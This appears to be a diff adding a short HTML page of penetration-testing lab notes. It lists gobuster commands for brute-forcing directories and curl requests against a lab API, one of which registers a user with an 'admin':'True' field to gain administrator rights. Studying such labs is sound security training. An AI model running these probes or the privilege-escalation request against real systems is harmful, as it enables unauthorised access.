@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Notes</title>
+</head><body>gobuster dir -u &lt;ip&gt; -w &lt;wordlist path&gt; -t 5<br/>
+<br/>
+*path to wordlists= /usr/share/wordlists/dirb/common.txt<br/>
+<br/>
+gobuster dir -u &lt;ip&gt; -w &lt;wordlist path&gt; -p worslist path<br/>
+<br/>
+*path to wordlists= /usr/share/wordlists/dirb/big.txt<br/>
+<br/>
+curl -i &lt;path&gt;<br/>
+<br/>
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern &nbsp; <br/>
+<br/>
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login &nbsp; <br/>
+curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register &nbsp; <br/>
+curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register &nbsp; </body></html>
